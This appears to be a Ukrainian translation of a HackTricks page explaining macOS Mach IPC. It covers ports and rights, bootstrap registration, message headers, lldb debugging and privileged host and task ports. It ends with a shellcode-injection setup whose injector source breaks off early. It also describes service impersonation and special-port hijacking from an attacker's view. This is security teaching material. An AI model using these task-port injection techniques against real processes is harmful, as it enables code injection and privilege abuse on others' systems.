# macOS IPC - Міжпроцесна комунікація

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging через Ports

### Базова інформація

Mach використовує **tasks** як **найменшу одиницю** для спільного використання ресурсів, і кожна task може містити **кілька threads**. Ці **tasks і threads відображаються 1:1 на POSIX processes і threads**.

Комунікація між tasks відбувається через Mach Inter-Process Communication (IPC), використовуючи односторонні канали комунікації. **Messages передаються між ports**, які функціонують як своєрідні **message queues**, керовані kernel.

**Port** є **базовим** елементом Mach IPC. Його можна використовувати для **надсилання та отримання messages**.

Кожен process має **IPC table**, у якій можна знайти **mach ports process**. Ім'я mach port фактично є числом (вказівником на об'єкт kernel).

Process також може надіслати ім'я port із певними правами **іншій task**, і kernel зробить так, щоб цей запис з'явився в **IPC table іншої task**.

### Port Rights

Port rights, які визначають, які операції може виконувати task, є ключовими для цієї комунікації. Можливі **port rights** такі ([визначення наведені тут](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[1]</sup>

- **Receive right**, який дозволяє отримувати messages, надіслані до port. Mach ports є MPSC (multiple-producer, single-consumer) queues, що означає: у всій системі може існувати лише **один receive right для кожного port** (на відміну від pipes, де кілька processes можуть мати file descriptors для кінця читання одного pipe).
- **Task із Receive** right може отримувати messages і **створювати Send rights**, що дозволяє їй надсилати messages. Спочатку лише **власна task має Receive right для свого port**.
- Якщо власник Receive right **завершується** або вбиває його, **send right стає непридатним (dead name).**
- **Send right**, який дозволяє надсилати messages до port.
- Send right можна **клонувати**, тому task, яка володіє Send right, може клонувати це право та **надати його третій task**.
- Зверніть увагу, що **port rights** також можна **передавати** через Mach messages.
- **Send-once right**, який дозволяє надіслати один message до port, після чого зникає.
- Це право **не можна** **клонувати**, але його можна **переміщувати**.
- **Port set right**, який позначає _port set_, а не окремий port. Витягування message із port set витягує message з одного з port, які він містить. Port sets можна використовувати для одночасного прослуховування кількох ports, подібно до `select`/`poll`/`epoll`/`kqueue` в Unix.
- **Dead name**, який не є фактичним port right, а лише заповнювачем. Коли port знищується, усі наявні port rights для цього port перетворюються на dead names.

**Tasks можуть передавати SEND rights іншим**, дозволяючи їм надсилати messages у відповідь. **SEND rights також можна клонувати, тому task може дублювати це право й передати його третій task**. Це, разом із проміжним process, відомим як **bootstrap server**, забезпечує ефективну комунікацію між tasks.

### File Ports

File ports дозволяють інкапсулювати file descriptors у Mac ports (використовуючи Mach port rights). Можна створити `fileport` із заданого FD за допомогою `fileport_makeport` і створити FD із fileport за допомогою `fileport_makefd`.

### Встановлення комунікації

Як згадувалося раніше, можна надсилати rights за допомогою Mach messages, однак **неможливо надіслати right, не маючи вже right** на надсилання Mach message. То як встановлюється перша комунікація?

Для цього залучається **bootstrap server** (**launchd** у macOS), оскільки **кожен може отримати SEND right до bootstrap server**, і можна попросити його надати right для надсилання message іншому process:

1. Task **A** створює **новий port**, отримуючи **RECEIVE right** для нього.
2. Task **A**, будучи власником RECEIVE right, **генерує SEND right для port**.
3. Task **A** встановлює **з'єднання** з **bootstrap server** і **надсилає йому SEND right** для port, який вона створила на початку.
- Пам'ятайте, що кожен може отримати SEND right до bootstrap server.
4. Task A надсилає message `bootstrap_register` до bootstrap server, щоб **пов'язати переданий port з іменем**, наприклад `com.apple.taska`.
5. Task **B** взаємодіє з **bootstrap server**, щоб виконати bootstrap **lookup для service** name (`bootstrap_lookup`). Щоб bootstrap server міг відповісти, task B надішле йому **SEND right для port, який вона попередньо створила**, всередині lookup message. Якщо lookup успішний, **server дублює SEND right**, отриманий від Task A, і **передає його Task B**.
- Пам'ятайте, що кожен може отримати SEND right до bootstrap server.
6. Маючи цей SEND right, **Task B** може **надсилати** **message** **Task A**.
7. Для двонаправленої комунікації task **B** зазвичай створює новий port із правами **RECEIVE** і **SEND** та передає **SEND right Task A**, щоб вона могла надсилати messages TASK B (двонаправлена комунікація).

Bootstrap server **не може автентифікувати** service name, заявлене task. Це означає, що **task** потенційно може **видати себе за будь-яку system task**, наприклад неправдиво **заявити ім'я authorization service**, а потім схвалювати кожен запит.

Після цього Apple зберігає **імена services, що надаються system**, у захищених configuration files, розташованих у **SIP-protected** directories: `/System/Library/LaunchDaemons` і `/System/Library/LaunchAgents`. Поруч з іменем кожного service також зберігається **пов'язаний binary**. Bootstrap server створює та зберігає **RECEIVE right для кожного з цих service names**.

Для цих predefined services **процес lookup дещо відрізняється**. Коли виконується lookup service name, launchd динамічно запускає service. Новий workflow виглядає так:

- Task **B** ініціює bootstrap **lookup** для service name.
- **launchd** перевіряє, чи process запущений, і, якщо ні, **запускає** його.
- Task **A** (service) виконує **bootstrap check-in** (`bootstrap_check_in()`). Тут **bootstrap** server створює SEND right, зберігає його та **передає RECEIVE right Task A**.
- launchd дублює **SEND right і надсилає його Task B**.
- **Task B** створює новий port із правами **RECEIVE** і **SEND** та передає **SEND right Task A** (svc), щоб вона могла надсилати messages TASK B (двонаправлена комунікація).

Однак цей процес застосовується лише до predefined system tasks. Non-system tasks і надалі працюють, як описано спочатку, що потенційно може дозволити impersonation.

> [!CAUTION]
> Тому launchd ніколи не повинен аварійно завершуватися, інакше вся sysem аварійно завершиться.

### Mach Message

[Більше інформації тут](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[4]</sup>

Функція `mach_msg`, по суті system call, використовується для надсилання й отримання Mach messages. Функція очікує message, яке потрібно надіслати, як перший аргумент. Це message має починатися зі структури `mach_msg_header_t`, після якої розташовується фактичний вміст message. Структура визначається так:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Процеси, що мають _**receive right**_, можуть отримувати повідомлення через Mach port. Водночас **відправникам** надається _**send**_ або _**send-once right**_. **send-once right** призначене виключно для надсилання одного повідомлення, після чого стає недійсним.

Початкове поле **`msgh_bits`** є bitmap:

- Перший біт (найбільш значущий) використовується для позначення того, що повідомлення є складним (докладніше про це нижче)
- 3-й і 4-й біти використовуються kernel
- **5 найменш значущих бітів 2-го байта** можуть використовуватися для **voucher**: іншого типу port для надсилання пар ключ/значення.
- **5 найменш значущих бітів 3-го байта** можуть використовуватися для **local port**
- **5 найменш значущих бітів 4-го байта** можуть використовуватися для **remote port**

Типи, які можна вказати у voucher, local і remote ports, наведено у файлі [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Наприклад, `MACH_MSG_TYPE_MAKE_SEND_ONCE` можна використати, щоб **вказати**, що для цього порту має бути похідне та передане **send-once** **право**. Також можна вказати `MACH_PORT_NULL`, щоб отримувач не мав змоги надіслати відповідь.

Щоб забезпечити просту **двонапрямлену комунікацію**, процес може вказати **mach port** у **заголовку** mach **повідомлення**, який називається _портом відповіді_ (**`msgh_local_port`**), куди **отримувач** повідомлення може **надіслати відповідь** на це повідомлення.

> [!TIP]
> Зверніть увагу, що цей тип двонапрямленої комунікації використовується в XPC-повідомленнях, які очікують відповідь (`xpc_connection_send_message_with_reply` і `xpc_connection_send_message_with_reply_sync`). Але **зазвичай створюються різні порти**, як пояснювалося раніше, для забезпечення двонапрямленої комунікації.

Інші поля заголовка повідомлення:

- `msgh_size`: розмір усього пакета.
- `msgh_remote_port`: порт, на який надсилається це повідомлення.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: ID цього повідомлення, який інтерпретується отримувачем.

> [!CAUTION]
> Зверніть увагу, що **mach-повідомлення надсилаються через `mach port`**, який є вбудованим у ядро mach каналом комунікації з **одним отримувачем** і **кількома відправниками**. **Кілька процесів** можуть **надсилати повідомлення** на mach port, але в будь-який момент лише **один процес може читати** з нього.

Потім повідомлення формуються із заголовка **`mach_msg_header_t`**, за яким ідуть **тіло** та **трейлер** (якщо є); воно також може надавати дозвіл на відповідь. У таких випадках ядру потрібно лише передати повідомлення від одного task до іншого.

**Трейлер** — це **інформація, додана до повідомлення ядром** (її не може встановити користувач), яку можна запросити під час отримання повідомлення за допомогою прапорців `MACH_RCV_TRAILER_<trailer_opt>` (можна запитати різну інформацію).

#### Складні повідомлення

Однак існують інші, більш **складні** повідомлення, наприклад ті, що передають додаткові права на порти або спільно використовують пам’ять; у таких випадках ядру також потрібно надіслати ці об’єкти отримувачу. У цьому випадку старший біт заголовка `msgh_bits` встановлюється.

Можливі дескриптори для передавання визначені у [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
У 32 бітах усі дескриптори мають розмір 12B, а тип дескриптора знаходиться в 11-му з них. У 64 бітах розміри відрізняються.

> [!CAUTION]
> Kernel скопіює дескриптори з одного task до іншого, але спочатку **створить копію в пам'яті kernel**. Цією технікою, відомою як "Feng Shui", зловживали в кількох експлойтах, щоб змусити **kernel копіювати дані у власну пам'ять**, змушуючи процес надсилати дескриптори самому собі. Потім процес може отримати повідомлення (kernel звільнить їх).
>
> Також можна **надіслати port rights вразливому процесу**, і port rights просто з'являться в процесі (навіть якщо він ними не керує).

### Mac Ports APIs

Зверніть увагу, що порти пов'язані з task namespace, тому для створення або пошуку порту також виконується запит до task namespace (більше інформації в `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Створити** порт.
- `mach_port_allocate` також може створити **port set**: receive right для групи портів. Щоразу під час отримання повідомлення вказується порт, з якого воно надійшло.
- `mach_port_allocate_name`: Змінити ім'я порту (за замовчуванням 32-бітове ціле число)
- `mach_port_names`: Отримати імена портів від target
- `mach_port_type`: Отримати rights task щодо імені
- `mach_port_rename`: Перейменувати порт (як dup2 для FDs)
- `mach_port_allocate`: Виділити новий RECEIVE, PORT_SET або DEAD_NAME
- `mach_port_insert_right`: Створити новий right у порту, де ви маєте RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Функції, що використовуються для **надсилання й отримання mach messages**. Версія overwrite дозволяє вказати інший buffer для отримання повідомлення (інша версія просто повторно використовує його).

### Debug mach_msg

Оскільки функції **`mach_msg`** і **`mach_msg_overwrite`** використовуються для надсилання й отримання повідомлень, встановлення breakpoint на них дасть змогу перевіряти надіслані та отримані повідомлення.

Наприклад, почніть debug будь-якої програми, яку ви можете debug, оскільки вона завантажить **`libSystem.B`, яка використовуватиме цю функцію**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Щоб отримати аргументи **`mach_msg`**, перевірте registers. Це аргументи (з [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Отримайте значення з реєстрів:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Перевірте заголовок повідомлення, перевіряючи перший аргумент:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Такий тип `mach_msg_bits_t` дуже поширений для забезпечення відповіді.

### Перерахування портів
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**name** — це стандартна назва, призначена порту (зверніть увагу, як вона **збільшується** у перших 3 байтах). **`ipc-object`** — це **обфускований** унікальний **ідентифікатор** порту.\
Також зверніть увагу, що порти, які мають лише право **`send`**, **ідентифікують власника** цього порту (назва порту + pid).\
Також зверніть увагу на використання **`+`** для позначення **інших tasks, підключених до того самого порту**.

Також можна використовувати [**procesxp**](https://www.newosxbook.com/tools/procexp.html), щоб переглядати **зареєстровані назви сервісів** (із вимкненим SIP через потребу в `com.apple.system-task-port`):
```
procesp 1 ports
```
Цей tool можна встановити в iOS, завантаживши його з [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Приклад коду

Зверніть увагу, як **sender** **виділяє** порт, створює **send right** для імені `org.darlinghq.example` і надсилає його на **bootstrap server**, тоді як sender запитує **send right** цього імені та використовує його для **надсилання повідомлення**.<sup>[1]</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Привілейовані порти

Існують спеціальні порти, які дозволяють **виконувати певні чутливі дії або отримувати доступ до певних чутливих даних**, якщо task має над ними права **SEND**. Це робить такі порти дуже цікавими з точки зору атакуючого не лише через їхні можливості, а й тому, що права **SEND** можна **поширювати між task**.

### Спеціальні порти хоста

Ці порти представлені числом.

Права **SEND** можна отримати, викликавши **`host_get_special_port`**, а права **RECEIVE** — викликавши **`host_set_special_port`**. Однак обидва виклики потребують порту **`host_priv`**, доступ до якого має лише root. Крім того, у минулому root міг викликати **`host_set_special_port`** і перехоплювати довільні порти, що, наприклад, дозволяло обходити підписи коду шляхом перехоплення `HOST_KEXTD_PORT` (тепер SIP запобігає цьому).

Вони поділяються на 2 групи: **перші 7 портів належать kernel**: 1 — `HOST_PORT`, 2 — `HOST_PRIV_PORT`, 3 — `HOST_IO_MASTER_PORT`, а 7 — `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Порти, що починаються **з** числа **8**, **належать system daemons** і можуть бути знайдені оголошеними у [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Порт хоста**: Якщо процес має привілей **SEND** над цим портом, він може отримувати **інформацію** про **систему**, викликаючи такі routines:
- `host_processor_info`: Отримання інформації про processor
- `host_info`: Отримання інформації про host
- `host_virtual_physical_table_info`: Таблиця Virtual/Physical сторінок (потребує MACH_VMDEBUG)
- `host_statistics`: Отримання статистики host
- `mach_memory_info`: Отримання розкладки kernel memory
- **Привілейований порт хоста**: Процес із правом **SEND** над цим портом може виконувати **привілейовані дії**, наприклад відображати boot data або намагатися завантажити kernel extension. **Процес має бути root**, щоб отримати цей дозвіл.
- Крім того, для виклику API **`kext_request`** потрібні інші entitlements — **`com.apple.private.kext*`**, які надаються лише Apple binaries.
- Інші routines, які можна викликати:
- `host_get_boot_info`: Отримання `machine_boot_info()`
- `host_priv_statistics`: Отримання privileged statistics
- `vm_allocate_cpm`: Виділення Contiguous Physical Memory
- `host_processors`: Надання права SEND для host processors
- `mach_vm_wire`: Зробити memory resident
- Оскільки **root** має доступ до цього дозволу, він може викликати **`host_set_[special/exception]_port[s]`**, щоб **перехопити special або exception ports хоста**.

Побачити **всі special ports хоста** можна, виконавши:
```bash
procexp all ports | grep "HSP"
```
### Спеціальні порти task

Це порти, зарезервовані для загальновідомих сервісів. Їх можна отримувати/встановлювати, викликаючи `task_[get/set]_special_port`. Їх можна знайти у `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):<sup>[9]</sup>

- **TASK_KERNEL_PORT**\[task-self send right]: Порт, що використовується для керування цим task. Використовується для надсилання повідомлень, які впливають на task. Це порт, який повертає **mach_task_self (see Task Ports below)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Bootstrap-порт task. Використовується для надсилання повідомлень із запитом на повернення інших портів системних сервісів.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Порт, який використовується для запиту інформації про host, що містить task. Це порт, який повертає **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Порт, що іменує джерело, з якого цей task отримує свою wired kernel memory.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Порт, що іменує джерело, з якого цей task отримує свою default memory managed memory.

### Task Ports

Спочатку Mach не мав "processes" — він мав "tasks", які більше нагадували контейнер для threads. Коли Mach об'єднали з BSD, **кожен task було зіставлено з BSD process**. Тому кожен BSD process має деталі, необхідні йому для роботи як process, а кожен Mach task також має свої внутрішні механізми (за винятком неіснуючого pid 0, яким є `kernel_task`).

Із цим пов'язані дві дуже цікаві функції:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Отримати SEND right для task, пов'язаного з task, визначеним через `pid`, і передати його до вказаного `target_task_port` (зазвичай це caller task, який використав `mach_task_self()`, але це може бути SEND port для іншого task).
- `pid_for_task(task, &pid)`: Маючи SEND right для task, визначити, з яким PID пов'язаний цей task.

Щоб виконувати дії всередині task, task потрібен `SEND` right на самого себе, отриманий викликом `mach_task_self()` (який використовує `task_self_trap` (28)). Маючи цей дозвіл, task може виконувати такі дії:

- `task_threads`: Отримати SEND right для всіх task ports threads цього task
- `task_info`: Отримати інформацію про task
- `task_suspend/resume`: Призупинити або відновити task
- `task_[get/set]_special_port`
- `thread_create`: Створити thread
- `task_[get/set]_state`: Керувати станом task
- та інші, описані в [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Зверніть увагу, що маючи SEND right на task port **іншого task**, можна виконувати такі дії над іншим task.

Крім того, task_port також є портом **`vm_map`**, який дає змогу **читати й змінювати memory** усередині task за допомогою таких функцій, як `vm_read()` і `vm_write()`. Це фактично означає, що task із SEND rights на task_port іншого task зможе **інжектити code в цей task**.

Пам'ятайте, що **kernel також є task**. Якщо хтось зможе отримати **SEND permissions** на **`kernel_task`**, він зможе змусити kernel виконати будь-що (jailbreaks).

- Викличте `mach_task_self()`, щоб **отримати name** цього порту для caller task. Цей порт лише **успадковується** через **`exec()`**; новий task, створений за допомогою `fork()`, отримує новий task port (як окремий випадок, task також отримує новий task port після `exec()` у suid binary). Єдиний спосіб створити task і отримати його port — виконати ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) під час `fork()`.
- Ось обмеження доступу до порту (з `macos_task_policy` binary `AppleMobileFileIntegrity`):
- Якщо app має **`com.apple.security.get-task-allow` entitlement**, processes від **того самого user** можуть отримати доступ до task port (зазвичай Xcode додає його для debugging). Процес **notarization** не дозволить використовувати його у production releases.
- Apps із **`com.apple.system-task-ports`** entitlement можуть отримати **task port будь-якого** process, крім kernel. У старіших версіях він називався **`task_for_pid-allow`**. Він надається лише Apple applications.
- **Root може отримувати доступ до task ports** apps, скомпільованих **без hardened** runtime (і не Apple apps).

**The task name port:** Непривілейована версія _task port_. Вона посилається на task, але не дозволяє керувати ним. Єдине, що, схоже, доступне через неї, — це `task_info()`.

### Thread Ports

Threads також мають пов'язані ports, які видимі task, що викликає **`task_threads`**, і processor через `processor_set_threads`. SEND right на thread port дає змогу використовувати функції з `thread_act` subsystem, зокрема:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Будь-який thread може отримати цей port, викликавши **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Ви можете отримати shellcode з:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compile** попередню програму та додайте **entitlements**, щоб мати змогу inject код від імені того самого користувача (інакше потрібно буде використовувати **sudo**).<sup>[3]</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
